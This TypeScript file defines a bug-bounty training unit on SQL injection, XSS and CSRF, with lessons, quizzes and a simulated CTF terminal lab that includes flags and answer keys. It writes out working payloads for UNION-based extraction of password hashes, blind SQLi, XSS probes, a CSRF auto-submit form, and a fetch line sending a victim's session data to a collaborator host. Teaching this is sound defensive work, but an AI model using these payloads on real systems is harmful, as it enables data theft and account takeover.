import type { Unit } from "../types";

const unit5: Unit = {
  id: "injection",
  index: 5,
  title: "Injection: SQLi & XSS",
  tagline: "The two bug classes that still, in 2026, pay more bounties than anything else.",
  tone: "offense",
  lessons: [
    {
      id: "sqli-manual",
      title: "SQL injection, by hand",
      summary: "Detect, confirm, extract — without sqlmap.",
      cards: [
        {
          title: "Detection",
          body: [
            "Add a single quote. If the response changes (error, 500, broken page), you have a candidate.",
            "Confirm with a boolean pair: `' AND 1=1-- -` vs `' AND 1=2-- -`. Different responses = injection confirmed.",
            "Numeric parameters: no quote needed. `id=1 AND 1=1` vs `id=1 AND 1=2`.",
          ],
          code: `# tests to try on every parameter
'            →   SQL error? candidate.
' OR '1'='1-- -
" OR "1"="1
) OR (1=1-- -
' AND SLEEP(5)-- -      (time-based blind)
' AND 1=1-- -           vs   ' AND 1=2-- -   (boolean blind)`,
          tone: "offense",
        },
        {
          title: "UNION-based extraction",
          body: [
            "If the result is reflected in the page, UNION is the fastest path.",
            "Find column count with ORDER BY, then pick a column that renders a string, then query out what you want.",
          ],
          code: `?id=1' ORDER BY 1-- -   OK
?id=1' ORDER BY 2-- -   OK
?id=1' ORDER BY 3-- -   error  → 2 columns

?id=1' UNION SELECT NULL,NULL-- -                       sanity
?id=1' UNION SELECT 1,version()-- -                     DB banner
?id=1' UNION SELECT 1,table_name FROM information_schema.tables-- -
?id=1' UNION SELECT 1,string_agg(column_name,',') FROM information_schema.columns WHERE table_name='users'-- -
?id=1' UNION SELECT 1,password FROM users WHERE id=1-- -   ← prove it; stop here for the report.`,
          tone: "offense",
        },
        {
          title: "Blind SQLi",
          body: [
            "No visible output and no error? Infer one bit at a time.",
            "Boolean: `AND SUBSTRING((SELECT password FROM users WHERE id=1),1,1)='a'`. True → one page, False → another.",
            "Time: `AND IF(SUBSTRING(...)='a',SLEEP(5),0)`. 5-second delay = bit confirmed.",
            "Automation is fine HERE (sqlmap --technique=T), as long as it's your own account and in-scope.",
          ],
        },
        {
          title: "Prepared statements, briefly",
          body: [
            "The fix (and the reason you'll stop finding this in modern frameworks on common paths): parameterised queries.",
            "`db.query('SELECT * FROM users WHERE id = $1', [req.id])` — the driver never substitutes `$1` into SQL text.",
            "Where you'll still find SQLi: dynamic ORDER BY, dynamic table names, raw string concat in reports / exports, legacy stored procedures, old PHP endpoints.",
          ],
          tone: "defense",
        },
      ],
      exercises: [
        {
          type: "mc",
          q: "A parameter returns different HTTP responses for `AND 1=1` vs `AND 1=2`, but the page content is identical. What is the technique called?",
          options: ["UNION-based", "Boolean blind SQLi", "Time-based blind SQLi", "Second-order SQLi"],
          answer: 1,
          explain: "Different status codes or lengths with no visible output = boolean blind SQLi.",
        },
        {
          type: "fill",
          q: "How do you find the number of columns in the current SQL query, as a hunter?",
          answers: ["order by", "order-by", "orderby", "order by 1,2,3"],
          explain: "Increment `ORDER BY N` until the query errors. N-1 is the column count.",
        },
        {
          type: "mc",
          q: "You confirm SQLi. For the bounty report, what should the PoC include?",
          options: [
            "A dump of the entire users table",
            "`SELECT version()` or `SELECT current_user()` output plus the exact payload and request",
            "Nothing, just a sentence",
            "A video of you dancing",
          ],
          answer: 1,
          explain: "Prove the capability, do not exploit the data. Dumping real user data risks your bounty and your freedom.",
        },
      ],
    },
    {
      id: "xss-families",
      title: "XSS: reflected, stored, DOM",
      summary: "Three ways to make the victim's browser run your JavaScript.",
      cards: [
        {
          title: "The three families",
          body: [
            "Reflected — input echoes back in the SAME response. Needs a victim to click a crafted link.",
            "Stored — input is saved (comment, profile, support ticket) and later rendered to someone else. Highest impact.",
            "DOM — a client-side script reads attacker-controlled data (location.hash, postMessage, localStorage) and writes it to the page unsafely. Server never sees the payload.",
          ],
          tone: "offense",
        },
        {
          title: "Detection payloads",
          body: [
            "Start with a non-destructive probe that is unmistakable in the response.",
          ],
          code: `# Reflected quick checks
?q=<x1x2x3>                       → appears raw in HTML?    good lead
?q=\"'><x1x2x3>                   → broke out of an attribute?

# Confirmed PoCs (minimal, non-destructive)
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><svg onload=alert(1)>             (attribute escape)
javascript:alert(1)                 (URL-context: href/src)

# DOM only
#"><img src=x onerror=alert(1)>
→ #fragment is NEVER sent to the server; purely client-side.`,
          tone: "offense",
        },
        {
          title: "Impact, not shock",
          body: [
            "`alert(1)` proves execution. For the report, replace it with ONE of:",
            "- `fetch('/api/me').then(r=>r.text()).then(x=>fetch('//collab.yourid.oastify.com/?x='+encodeURIComponent(x)))`",
            "  (reads a sensitive endpoint using the victim's session, exfils to Burp Collaborator)",
            "- Change the user's email via a POST — then revert.",
            "Impact chapter: 'arbitrary account takeover via stored XSS in /comments', not 'alert fires'.",
          ],
        },
        {
          title: "CSP: the mitigation you'll meet",
          body: [
            "Content-Security-Policy limits where scripts can run from. A strict CSP breaks `<script>alert(1)</script>`.",
            "Bypasses: unsafe-inline is still common, script-src 'self' + an uploadable JSONP endpoint, dangling markup, DOM clobbering.",
            "`csp-evaluator.withgoogle.com` scores a policy and highlights weaknesses.",
          ],
          tone: "defense",
        },
      ],
      exercises: [
        {
          type: "match",
          q: "Match each XSS to its highest-impact example.",
          pairs: [
            ["Reflected", "Phishing link that steals session on click"],
            ["Stored", "Script in a comment that hijacks every reader"],
            ["DOM", "Payload in the URL fragment that never reaches the server"],
          ],
          explain: "Stored is almost always the highest severity because the attacker doesn't need to trick anyone individually.",
        },
        {
          type: "mc",
          q: "`<x1x2x3>` echoes back in the HTML unescaped. Next payload?",
          options: [
            "A denial-of-service loop",
            "`<svg onload=alert(1)>` or `<img src=x onerror=alert(1)>`",
            "Buy a new domain",
            "File a report immediately with just the echo",
          ],
          answer: 1,
          explain: "Confirm execution with a minimal payload before writing the report.",
        },
        {
          type: "mc",
          q: "DOM XSS vs reflected XSS: what's the testable difference?",
          options: [
            "DOM XSS payload is in the URL fragment and never leaves the browser",
            "DOM XSS only works on mobile",
            "They are the same",
            "DOM XSS doesn't need JavaScript",
          ],
          answer: 0,
          explain: "`#payload` is never sent to the server. If the bug fires with the payload in the fragment, it's DOM.",
        },
      ],
    },
    {
      id: "csrf",
      title: "CSRF, briefly",
      summary: "Making the victim's browser perform a state-changing request.",
      cards: [
        {
          title: "The classic",
          body: [
            "Victim is logged into bank.example. Attacker gets them to visit evil.example. The attacker page submits a form to bank.example/transfer — the browser attaches the bank session cookie automatically.",
            "Modern mitigations: SameSite=Lax by default (Chrome, since 2020), CSRF tokens in forms, double-submit cookie pattern.",
          ],
          code: `<!-- evil.example -->
<form action="https://bank.example/transfer" method="POST">
  <input name="to" value="attacker">
  <input name="amount" value="1000">
</form>
<script>document.forms[0].submit()</script>`,
          tone: "offense",
        },
        {
          title: "Where it still works",
          body: [
            "Endpoints that accept GET for state changes.",
            "APIs that accept text/plain or application/x-www-form-urlencoded without a token.",
            "SameSite=None (common in cross-site iframes) with no token.",
            "Older browsers / Safari quirks around iframes.",
          ],
        },
      ],
      exercises: [
        {
          type: "mc",
          q: "The browser default SameSite is now Lax. What does that actually block?",
          options: [
            "All cross-site requests",
            "Cross-site POSTs, cookies are not sent",
            "Only HTTPS requests",
            "Nothing",
          ],
          answer: 1,
          explain: "Lax lets top-level GETs through for usability, but cross-site POSTs lose the cookie — breaking most classical CSRF.",
        },
      ],
    },
  ],
  lab: {
    id: "lab-injection",
    title: "CTF: injection playground",
    tone: "offense",
    briefing: [
      "Target: https://shop.example — the public catalogue + search.",
      "Find a SQLi in /search, extract the admin password hash, then find a stored XSS in /comments.",
      "Grab both flags. Format: FLAG{...}",
    ],
    terminal: {
      host: "hunter@kali",
      commands: {
        "curl 'https://shop.example/search?q=book'":
          "<h2>Results for 'book'</h2>\n<li>Book 1 — $12.00</li>\n<li>Book 2 — $19.00</li>",
        "curl \"https://shop.example/search?q=book'\"":
          "<h2>Results for 'book''</h2>\n<pre>SQLSTATE[42000]: Syntax error near 'book'' at line 1\nQuery: SELECT title,price FROM items WHERE title LIKE '%book'%'</pre>",
        "curl \"https://shop.example/search?q=book' UNION SELECT NULL,NULL-- -\"":
          "<h2>Results for 'book' UNION SELECT NULL,NULL-- -'</h2>\n(no rows)",
        "curl \"https://shop.example/search?q=book' UNION SELECT version(),current_user()-- -\"":
          "<h2>Results</h2>\n<li>MySQL 5.7.42 — shop_app@localhost</li>",
        "curl \"https://shop.example/search?q=x' UNION SELECT table_name,NULL FROM information_schema.tables-- -\"":
          "<h2>Results</h2>\n<li>items</li>\n<li>users</li>\n<li>sessions</li>\n<li>flags</li>",
        "curl \"https://shop.example/search?q=x' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -\"":
          "<h2>Results</h2>\n<li>id</li>\n<li>username</li>\n<li>password_hash</li>\n<li>role</li>",
        "curl \"https://shop.example/search?q=x' UNION SELECT username,password_hash FROM users WHERE role='admin'-- -\"":
          "<h2>Results</h2>\n<li>admin — $2b$12$FLAG{un10n_based_sql1_still_pays_in_2026}.rest.of.hash</li>",
        "curl 'https://shop.example/comments?post=1'":
          "<article>Great product! — <b>charlie</b></article>",
        "curl 'https://shop.example/comments?post=1' -d 'text=<x1x2x3>'":
          "stored. GET /comments?post=1 to view.",
        "curl 'https://shop.example/comments?post=1'  # after storing <x1x2x3>":
          "<article>Great product! — <b>charlie</b></article>\n<article><x1x2x3> — <b>you</b></article>  <-- reflected unescaped",
        "curl 'https://shop.example/comments?post=1' -d 'text=<svg onload=alert(1)>'":
          "stored.",
        "curl 'https://shop.example/comments?post=1'  # after storing SVG":
          "<article>Great product! — <b>charlie</b></article>\n<article><svg onload=alert(1)> — <b>you</b></article>  (would fire in a real browser)",
        "curl 'https://shop.example/comments/flag'":
          "{\"note\":\"stored XSS owners get the flag\",\"flag\":\"FLAG{st0red_xss_pwns_every_reader}\"}",
      },
      hints: [
        "curl 'https://shop.example/search?q=book'",
        "curl \"https://shop.example/search?q=book'\"",
        "curl \"https://shop.example/search?q=book' UNION SELECT version(),current_user()-- -\"",
        "curl \"https://shop.example/search?q=x' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -\"",
        "curl \"https://shop.example/search?q=x' UNION SELECT username,password_hash FROM users WHERE role='admin'-- -\"",
        "curl 'https://shop.example/comments?post=1' -d 'text=<svg onload=alert(1)>'",
        "curl 'https://shop.example/comments/flag'",
      ],
    },
    tasks: [
      {
        q: "What DBMS and major version is backing /search?",
        answers: ["mysql 5.7", "mysql 5.7.42", "mysql"],
        hint: "`version()` via a UNION query.",
      },
      {
        q: "Name the vulnerable parameter.",
        answers: ["q", "search q", "?q"],
        hint: "It appears in /search?q=…",
      },
      {
        q: "Flag 1 (hidden in the admin password hash).",
        answers: ["FLAG{un10n_based_sql1_still_pays_in_2026}", "un10n_based_sql1_still_pays_in_2026"],
        hint: "UNION SELECT username,password_hash FROM users WHERE role='admin'.",
      },
      {
        q: "Flag 2 (comment-engine stored XSS).",
        answers: ["FLAG{st0red_xss_pwns_every_reader}", "st0red_xss_pwns_every_reader"],
        hint: "GET /comments/flag after storing an XSS payload.",
      },
    ],
  },
  ids: {
    name: "Injection kit",
    description:
      "You can detect, confirm, and responsibly prove SQL injection and all three XSS families — the two highest-paying bug classes in bounty.",
    rules: [],
  },
};

export default unit5;
